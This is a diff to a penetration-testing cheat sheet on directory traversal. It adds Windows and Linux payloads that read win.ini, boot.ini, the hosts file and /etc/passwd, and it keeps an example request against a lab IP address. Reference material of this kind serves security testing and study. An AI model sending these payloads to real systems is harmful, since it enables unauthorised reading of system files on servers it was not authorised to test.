@@ -3,13 +3,17 @@
 Test for directory traversal attacks whenever you find user-controllable inputs that influence file access, especially in URL parameters or form inputs that specify files or directories.
 
 #### **Payload**
+##### **Windows:**
 ```
 ../../../../../../../windows/win.ini
-
-or
-
+../../../../../../../windows/boot.ini
+../../../../../../../windows/system32/drivers/etc/hosts
+```
+##### **Linux:**
+```
 ../../../../../../../etc/passwd
 ```
+
 **Examples**
 ```
 http://192.168.118.126/siteadmin/dev?piano_f=../../../../../etc/passwd
